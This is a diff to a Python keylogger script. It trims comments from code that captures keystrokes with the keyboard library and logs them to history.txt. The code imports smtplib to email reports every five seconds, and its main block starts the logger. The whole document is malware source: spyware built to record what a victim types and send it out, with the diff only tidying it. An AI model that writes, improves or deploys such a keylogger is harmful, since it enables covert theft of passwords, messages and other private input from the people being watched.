@@ -1,10 +1,10 @@
-import keyboard # for keylogs
+import keyboard
 import smtplib # for sending email using SMTP protocol (gmail)
 # Timer is to make a method runs after an `interval` amount of time
 from threading import Timer
 from datetime import datetime
 
-SEND_REPORT_EVERY = 5 # in seconds, 60 means 1 minute and so on
+SEND_REPORT_EVERY = 5 # in seconds
 
 class Keylogger:
     def __init__(self, interval):
@@ -12,7 +12,6 @@ class Keylogger:
         self.interval = interval
         self.filename = "history.txt"
         # this is the string variable that contains the log of all 
-        # the keystrokes within `self.interval`
         with open(f"{self.filename}","r") as x:
             text = x.read()
         self.log = text
@@ -77,9 +76,5 @@ class Keylogger:
 
     
 if __name__ == "__main__":
-    # if you want a keylogger to send to your email
-    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
-    # if you want a keylogger to record keylogs to a local file 
-    # (and then send it using your favorite method)
     keylogger = Keylogger(interval=SEND_REPORT_EVERY)
     keylogger.start()
